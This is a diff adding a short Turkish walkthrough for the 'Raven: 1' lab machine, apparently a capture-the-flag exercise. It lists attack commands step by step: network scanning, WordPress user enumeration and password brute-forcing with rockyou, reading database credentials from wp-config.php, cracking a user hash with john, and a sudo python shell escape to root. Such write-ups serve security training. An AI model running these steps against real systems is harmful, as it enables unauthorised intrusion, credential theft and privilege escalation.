@@ -1,0 +1,15 @@
+RAVEN: 1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.150 bulundu.
+2 - nmap -A 192.168.2.150 
+3 - gobuster dir -u http://192.168.2.150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - wpscan --url http://192.168.2.150/wordpress/ -e u, Users: steven, michael
+5 - wpscan --url http://192.168.2.150/wordpress/ -e p --usernames michael --passwords /usr/share/wordlists/rockyou.txt, michael : michael
+6 - ssh michael@192.168.2.150
+7 - cat /var/www/hmtl/wordpress/wp-config.php, root : R@v3nSecurity
+8 - mysql -u root -p
+9 - use mysql, use wordpress, select * from wp_users
+10 - john hash -w=/usr/share/wordlists/rockyou.txt, steven : pink84
+11 - su steven, sudo -l
+12 - sudo python -c 'import os; os.system("/bin/sh")'
+13 - whoami
+
